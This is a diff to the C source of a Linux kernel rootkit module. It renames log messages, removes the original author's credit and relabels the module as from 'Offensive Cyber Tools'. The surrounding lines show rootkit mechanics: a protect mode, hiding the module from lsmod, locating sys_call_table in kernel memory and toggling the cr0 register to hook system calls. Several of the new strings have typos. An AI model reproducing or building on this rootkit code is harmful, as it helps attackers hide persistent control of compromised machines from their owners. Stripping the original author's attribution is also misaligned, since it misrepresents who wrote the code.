@@ -184,7 +184,7 @@ static void protect_rootkit(void)
 
 		is_protected = 1;
 
-		printk(KERN_INFO "[*] reveng_rtkit: PROTECT MODE => ON! \n");
+		printk(KERN_INFO "[*] rootkit: PROTECT MODE => ON! \n");
 	}
 }
 
@@ -203,7 +203,7 @@ static void remove_rootkit(void)
 
 		is_protected = 0;
 
-		printk(KERN_INFO "[*] reveng_rtkit: PROTECT MODE => OFF \n");
+		printk(KERN_INFO "[*] roottkit: PROTECT MODE => OFF \n");
 	}
 }
 
@@ -277,8 +277,7 @@ static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 static int __init rootkit_init(void)
 {
 	printk(KERN_INFO "=================================================\n");
-	printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
-	printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");
+	printk(KERN_INFO "[+] rookit: Loaded \n");
 
 	/* Hiding our Rootkit from: 
 	 * `lsmod` cmd, 
@@ -300,7 +299,7 @@ static int __init rootkit_init(void)
 	if (!__sys_call_table)
 		return -1;
 
-	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
+	printk(KERN_INFO "[+] rootkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
 
 
 	/* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
@@ -444,9 +443,9 @@ static void __exit rootkit_exit(void)
 	//Unregistering the character device
         unregister_chrdev_region(dev, 1);
         
-        printk(KERN_INFO "[*] reveng_rtkit: Unregistering the Character device \n");
+        printk(KERN_INFO "[*] rootkit: Unregistering the Character device \n");
 
-	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
+	printk(KERN_INFO "[-] rootkit: Unloaded \n");
 	printk(KERN_INFO "=================================================\n");
 }
 
@@ -454,7 +453,7 @@ module_init(rootkit_init);
 module_exit(rootkit_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("reveng007");
-MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
+MODULE_AUTHOR("Offensive Cyber Tools");
+MODULE_DESCRIPTION("Modifying Stage of rootkit");
 MODULE_VERSION("1.0");
 
